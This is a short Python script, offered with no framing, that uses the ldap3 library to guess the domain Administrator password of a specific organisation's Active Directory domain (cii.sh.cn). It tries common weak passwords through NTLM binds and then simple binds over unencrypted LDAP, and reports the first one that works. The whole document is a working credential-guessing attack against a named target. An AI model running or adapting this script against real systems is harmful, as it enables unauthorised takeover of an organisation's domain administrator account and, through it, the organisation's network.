from ldap3 import Server, Connection, ALL, NTLM
import sys

server = Server('******', get_info=ALL, use_ssl=False, port=389)

credentials = [
    ('cii.sh.cn\\Administrator', 'P@ssw0rd'),
    ('cii.sh.cn\\Administrator', 'Admin@123'),
    ('cii.sh.cn\\Administrator', 'Aa123456!'),
    ('cii.sh.cn\\administrator', 'P@ssw0rd'),
    ('CII\\Administrator', 'P@ssw0rd'),
    ('Administrator@cii.sh.cn', 'P@ssw0rd'),
]

for user, pwd in credentials:
    try:
        conn = Connection(server, user=user, password=pwd, authentication=NTLM, auto_bind=True)
        print(f"SUCCESS: {user} / {pwd}")
        conn.unbind()
        sys.exit(0)
    except Exception as ex:
        print(f"FAILED: {user} / {pwd} -> {ex}")

print("\nAll credentials failed. Trying simple bind...")
for user_fmt, pwd in [('Administrator@cii.sh.cn', 'P@ssw0rd'), ('cn=Administrator,cn=Users,dc=cii,dc=sh,dc=cn', 'P@ssw0rd')]:
    try:
        conn = Connection(server, user=user_fmt, password=pwd, auto_bind=True)
        print(f"SIMPLE BIND SUCCESS: {user_fmt} / {pwd}")
        conn.unbind()
        sys.exit(0)
    except Exception as ex:
        print(f"SIMPLE BIND FAILED: {user_fmt} / {pwd} -> {ex}")